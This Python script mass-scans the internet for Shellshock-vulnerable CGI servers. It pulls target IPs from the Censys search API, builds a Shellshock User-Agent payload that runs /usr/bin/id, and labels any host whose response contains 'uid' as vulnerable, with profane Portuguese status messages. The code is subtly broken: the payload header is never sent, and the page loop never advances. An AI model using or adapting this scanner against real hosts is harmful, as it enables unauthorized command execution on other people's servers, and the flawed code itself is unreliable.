# coding=utf-8

from termcolor import cprint
import json
import requests

API_URL = "https://www.censys.io/api/v1"
UID = ""
SECRET = ""

pages = float('inf')
page = 1
acha = 'uid'

query = {'query':'80.http.get.title:/cgi/bin','page':page}
user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id"}

while page <= pages:
    res = requests.post(API_URL + "/search/ipv4", auth=(UID, SECRET), json=query)
    payload = res.json()

    if res.status_code == 200:
        for r in payload['results']:
            url_test = 'http://'+r['ip']+'/cgi-bin'
            cprint('[+] - Testando conexao '+url_test,'blue')
            try:
                ss = requests.get(url_test, timeout=5, allow_redirects=True)
                sc = ss.status_code
                if sc != 200:
                    cprint("[!] - FDP NAO CONECTOU",'red')
                    print("[!] - STATUS CODE: %d") %(sc)
                    print
                else:
                    cprint("[+] - AI CONECTO PORRA",'green')
                    print("[!] - STATUS CODE: %d") %(sc)
                    if ss.content.find(acha) != -1:
                        cprint("[+] - VULN3R4V3L P0RR4",'green','on_red')
                    print
            except:
                cprint("[!] - DEU MERDA",'red','on_yellow')
                print
